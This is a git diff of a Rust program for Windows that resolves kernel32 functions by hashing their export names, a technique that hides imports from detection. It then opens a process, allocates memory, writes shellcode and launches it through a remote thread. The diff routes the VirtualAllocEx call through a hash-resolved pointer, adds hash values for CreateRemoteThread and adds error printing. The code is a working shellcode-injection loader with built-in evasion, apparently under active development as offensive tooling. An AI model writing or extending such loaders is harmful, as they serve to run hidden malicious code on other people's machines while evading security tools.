@@ -13,7 +13,7 @@ use windows::{
             LibraryLoader::{LoadLibraryA, GetProcAddress},
             SystemServices::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY},
         },
-        Foundation::{CloseHandle, BOOL, HMODULE, HANDLE, WAIT_EVENT, FARPROC},
+        Foundation::{CloseHandle, BOOL, HMODULE, HANDLE, WAIT_EVENT, FARPROC, GetLastError},
         Security::SECURITY_ATTRIBUTES,
     },
     core::{PCSTR, Result},
@@ -35,7 +35,7 @@ type TIsDebuggerPresent = unsafe extern "system" fn() -> BOOL;
 
 type TVirtualAllocEx = unsafe extern "system" fn(
     hprocess: HANDLE,
-    lpaddress: Option<*const c_void>,
+    lpaddress: *const c_void,
     dwsize: usize,
     flallocationtype: VIRTUAL_ALLOCATION_TYPE,
     flprotect: PAGE_PROTECTION_FLAGS
@@ -100,7 +100,7 @@ fn getFuncAddressByHash(lib: &str, hash: u32) -> *const u32 {
         let lib_ptr: PCSTR = PCSTR::from_raw(format!("{}\0", lib).as_ptr());
 
         let libBase: Result<HMODULE> = LoadLibraryA(lib_ptr);
-
+        
         match libBase {
             Ok(h) => {
                 println!("\n");
@@ -154,6 +154,7 @@ fn getFuncAddressByHash(lib: &str, hash: u32) -> *const u32 {
                     let func_name_hash: u32 = getHashFromFunc(func_name_str) as u32;
                     
                     if func_name_hash == hash {
+                        //println!("{:?} {:#x} {:#x} {:#x}", addr_names_ordinals_RVA.offset(i as isize), *addr_names_ordinals_RVA.offset(i as isize), addr_func_RVA.offset(*addr_names_ordinals_RVA.offset(i as isize) as isize) as u32, *addr_func_RVA.offset(*addr_names_ordinals_RVA.offset(i as isize) as isize) as u32);
                         let func_addr_RVA: u32 = *addr_func_RVA.offset(*addr_names_ordinals_RVA.offset(i as isize) as isize) as u32;
                         let func_addr: *const u32 = base_ptr.add(func_addr_RVA as usize) as *const u32;
                         println!("[i] address of {} : {:?} / RVA : {:?}", func_name_str, func_addr, func_addr_RVA);
@@ -190,12 +191,15 @@ fn main() {
 
     //getFuncAddressByHash("kernel32", 0xf92f7b);
 
-    //println!("{:#x}", getHashFromFunc("VirtualFree"));
+    //println!("{:#x}", getHashFromFunc("CreateRemoteThreadEx"));
+    //println!("{:#x}", getHashFromFunc("CreateRemoteThread"));
 
     let pid = process::id();
 
     unsafe {        
         println!("[i] Trying to open a Handle for the Process {pid}");
+
+        assert_eq!(getHashFromFunc("CreateRemoteThreadEx"), 0x857934);
         
         let XOpenProcess: TOpenProcess = mem::transmute(getFuncAddressByHash("kernel32.dll", 0x9e08d0) as *const u32);
         let hprocess = XOpenProcess(PROCESS_ALL_ACCESS, false.into(), pid);
@@ -214,15 +218,14 @@ fn main() {
         }
 
         let XVirtualAllocEx: TVirtualAllocEx = mem::transmute(getFuncAddressByHash("kernel32.dll", 0x4fd152) as *const u32);
-        let haddr = VirtualAllocEx(
+        let haddr = XVirtualAllocEx(
             hprocess,
-            Some(null_mut()),
+            null_mut(),
             shellcode.len(),
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE,
         );
 
-        println!("{:?}", haddr);
         if haddr.is_null() {
             eprintln!("[!] Failed to Allocate Memory in Target Process.");
             let _ = CloseHandle(hprocess);
@@ -267,6 +270,8 @@ fn main() {
                 process::exit(-1);
             }
         );
+
+        println!("Last Error : {:?}", GetLastError());
 
         let XWaitForSingleObject: TWaitForSingleObject = mem::transmute(getFuncAddressByHash("kernel32.dll", 0x397566) as *const u32);
         XWaitForSingleObject(hthread, INFINITE);
